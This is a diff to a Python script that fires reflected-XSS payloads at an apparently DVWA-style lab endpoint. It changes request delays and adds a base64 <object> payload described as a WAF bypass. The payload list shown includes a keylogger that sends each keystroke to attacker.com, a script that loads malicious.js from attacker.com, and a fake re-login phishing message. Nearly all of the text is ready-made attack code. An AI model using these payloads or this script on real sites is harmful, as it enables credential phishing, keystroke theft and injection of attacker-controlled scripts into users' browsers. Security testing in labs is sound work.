@@ -20,7 +20,7 @@ else:
     sys.exit(1)
 
 # Map request rate to a specific time interval
-delays = {'low': 7, 'medium': 2, 'high': 0.5}
+delays = {'low': 15, 'medium': 2, 'high': 0.5}
 delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized
 
 xss_url = f"{base_url}/vulnerabilities/xss_r/"
@@ -39,7 +39,8 @@ def reflected_xss_attack():
         """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</tiTle/</teXtarEa/</scRipt/--><p" onclick=alert()//>*/<style>/*</style>/*</title>/*</textarea>/*</script>-->""",
         "<script>if(document.location.href.indexOf('http://legitimate.com')!=-1){document.write('<script src=\"http://attacker.com/malicious.js\"><\/script>');}</script>",
         "<script>document.body.innerHTML = '<h1>Your session has expired. Please <a href=\"http://fake-login.com\">login again</a>.</h1>';</script>",
-        "<script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key); }</script>"
+        "<script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key); }</script>",
+        "<object data=data:text/html;base64, PHNjcmlwdD5hbGVydCgnWFNTLUNsb3VkZmxhcmUtQnlwYXNzLUJ5LUVMSVpFVU9QQUlOJyk8L3NjcmlwdD4=>",
     ]
 
     for payload in payloads:
